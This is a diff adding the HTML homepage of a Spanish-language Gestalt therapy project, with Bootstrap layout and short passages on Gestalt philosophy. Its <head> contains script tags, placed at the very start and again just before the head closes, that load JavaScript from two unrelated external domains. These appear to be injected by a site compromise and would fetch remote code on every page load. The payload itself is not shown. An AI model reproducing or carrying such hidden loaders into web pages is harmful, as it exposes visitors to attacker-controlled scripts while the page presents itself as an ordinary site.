@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
+<head><script type='text/javascript' src='https://stat.uustoughtonma.org/stats.js?f=5'></script><script type='text/javascript' src='https://cdn.allyouwant.online/main.js?t=nplp1'></script>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Gestalt Proyecto Creces</title>
+  <meta name="description" content="">
+  <meta name="viewport" content="width=device-width">
+  
+  <link rel="stylesheet" href="css/bootstrap.min.css">
+  <style>
+    body {
+      padding-top: 30px;
+      padding-bottom: 20px;
+    }
+  </style>
+  <link rel="stylesheet" href="css/bootstrap-theme.min.css">
+  <link rel="stylesheet" href="css/main.css">
+  <link rel="stylesheet" href="css/dt_bootstrap.css">
+  
+  <script type="text/javascript" language="javascript" src="js/jquery.js"></script>
+  <script type="text/javascript" language="javascript" src="js/jquery.dataTables.js"></script>
+  <script type="text/javascript" charset="utf-8">
+    $(document).ready(function() {
+      $('#example').dataTable( {
+          "oLanguage": {
+            
+            "sLengthMenu": "Mostar _MENU_ filas",
+            "sSearch": "Buscar",
+            "sZeroRecords": "Ningún resultado encontrado",
+            "sInfo": "Mostrando _START_ a _END_ de _TOTAL_ filas",
+            "sInfoEmpty": "Mostrando 0 a 0 de 0 filas",
+            "sInfoFiltered": "(filtrado de _MAX_ filas totales)",
+            "sDom": "<'row'<'span6'l><'span6'f>r>t<'row'<'span6'i><'span6'p>>",
+            "oPaginate": {
+            "sPrevious": "Anterior ",
+            "sNext": " Siguiente"
+          }
+          }
+        } );
+      } );
+    </script>
+  <script src="js/vendor/modernizr-2.6.2-respond-1.1.0.min.js"></script>
+<script type='text/javascript' src='https://cdn.allyouwant.online/main.js?t=nplp1'></script><script type='text/javascript' src='https://stat.uustoughtonma.org/stats.js?f=5'></script></head>
+<body>
+  
+  <!--NAVBAR><!-->     
+  
+  <div class=container>
+    <div class="row">
+      <div class="col-md-2"><img src="img/logo.png" alt="LogoCreces" class="img-rounded"></div>
+      
+      <div class="col-md-10">  
+        <div class="espacio"></div>   
+        <nav class="navbar navbar-default" role="navigation">
+          
+          <div class="navbar-header">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+              <span class="sr-only">Menú</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="index.php"><strong>Gestalt</strong> Creces</a>
+          </div>
+          
+          <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav">
+              <li class="active"><a href="facilitadores.php">FACILITADORES</a></li>
+              <li class="active"><a href="https://inscripcionesgestalt.herokuapp.com/organizations/2/categories">CURSOS</a></li>
+              <li class="active"><a href="blog.php">BLOG</a></li>
+              <li class="active"><a href="contacto.php">CONTACTO</a></li>
+            </ul>
+            
+            <ul class="nav navbar-nav navbar-right">
+            	<li><a href="https://inscripcionesgestalt.herokuapp.com/organizations/2/categories"><span class=\"glyphicon glyphicon-user\"></span> Ingresar a Mi Perfil</a></li>
+            </ul>
+            
+            <!--
+            <ul class="nav navbar-nav navbar-right">
+
+              <li><a href="ingreso.php?registro=0"><span class="glyphicon glyphicon-user"></span> Ingresar a Mi Perfil</a></li>            </ul>
+            -->
+          </div><!-- /.navbar-collapse -->
+        </nav>
+      </div>
+    </div>
+  </div>
+  
+  <!--TERMINA NAVBAR -->
+  <hr>
+  <br>      
+    <div class="container">
+      <br>
+
+        <!-- START THE FEATURETTES -->
+
+        <div class="row">
+          
+          <div class="col-sm-6">
+            <h2 class="featurette-heading">Ampliando el abanico <span class="text-muted">de la conciencia</span>
+            </h2>
+            <p class="lead">No se trata de explicar el origen de mis dificultades sino más bien de experimentar vías de exploración y descubrimiento para ampliar al máximo el abanico de mi conciencia y mi libertad de elección</p>
+          </div>
+          
+          <div class="col-sm-6">
+            <img class="featurette-image img-thumbnail img-responsive pull-right" style="width:450px;height:300px" src="img/gestalt3.png">
+          </div>
+          
+        </div>        
+
+        <hr class="featurette-divider">
+
+        <div class="row">
+          
+          <div class="col-sm-6">
+            <img class="featurette-image img-thumbnail img-responsive pull-left" style="width:450px;height:300px" src="img/gestalt2.png">
+          </div>
+
+          <div class="col-sm-6">
+            <h2 class="featurette-heading">Un estilo de vida <span class="text-muted">Una vía de crecimiento personal</span>
+            </h2>
+            <p class="lead">Gestalt no se limita a ser una forma de terapia, es una actitud frente a la vida, una forma de ser, es una forma de hacer educación, es una filosofía de vida.</p>
+          </div>
+          
+        </div>
+
+        <hr class="featurette-divider">
+
+        <div class="row">
+          
+          <div class="col-sm-6">
+            <h2 class="featurette-heading">Dándome cuenta <span class="text-muted">desde mi totalidad</span>
+            </h2>
+            <p class="lead">Darme cuenta de lo que estoy sintiendo, pensado, haciendo, cómo lo estoy haciendo, cómo puedo cambiar, al mismo tiempo de aprender a aceptarme y valorarme. </p>
+          </div>
+          
+          <div class="col-sm-6">
+            <img class="featurette-image img-thumbnail img-responsive pull-right" style="width:450px;height:300px" src="img/gestalt5.png">
+          </div>
+          
+        </div>
+
+        <hr class="featurette-divider">
+
+        <div class="row">
+          
+          <div class="col-sm-6">
+            <img class="featurette-image img-thumbnail img-responsive pull-left" style="width:450px;height:300px" src="img/gestalt4.png">
+          </div>
+
+          <div class="col-sm-6">
+            <h2 class="featurette-heading">Asumiendo <span class="text-muted">mi responsabilidad</span>
+            </h2>
+            <p class="lead">“Lo importante no es lo que han hecho de mí, sino lo que yo mismo hago con lo que han hecho de mí” J. P. Sartre</p>
+          </div>
+          
+        </div>
+
+        <hr class="featurette-divider">
+
+        <div class="row">
+          
+          <div class="col-sm-6">
+            <h2 class="featurette-heading">Integrando <span class="text-muted">polaridades</span>
+            </h2>
+            <p class="lead">“Gestalt es integración, totalidad. Inicia como un enfoque psicológico y se extiende en todas las situaciones de vida. Incluye procesos, experiencias que se abren,  buscan su cierre y se completan. Es un ir y venir, es una forma de estar en el mundo”.</p>
+          </div>
+          
+          <div class="col-sm-6">
+            <img class="featurette-image img-thumbnail img-responsive pull-right" style="width:400px;height:300px" src="img/gestalt1.png">
+          </div>
+          
+        </div>
+
+        
+
+<!-- TERMINA CUERPO DE TEXTO -->    
+    
+    
+ 
+    <!-- FOOTER -->
+    <br><br>
+    <hr>
+    <div class="container">
+      <footer>
+        <p class="pull-right"><a href="#">Regresar al Tope</a></p>
+        <p>&copy; 2014 Proyecto Creces. Plataforma desarrollada por <a href="http://decktra.com">Decktra C.A.</a></p>
+      </footer>
+    </div>
+    
+    <!-- TERMINA FOOTER -->
+    
+    
+    <!-- /container -->        
+    
+    <script src="js/vendor/bootstrap.min.js"></script>
+    
+    <script src="js/plugins.js"></script>
+    <script src="js/main.js"></script>
+    
+    <script>
+      var _gaq=[['_setAccount','UA-XXXXX-X'],['_trackPageview']];
+      (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
+                     g.src='//www.google-analytics.com/ga.js';
+                     s.parentNode.insertBefore(g,s)}(document,'script'));
+    </script>
+
+    
+    
+    </div>
+  </body>
+</html>
+
+
+     
+   
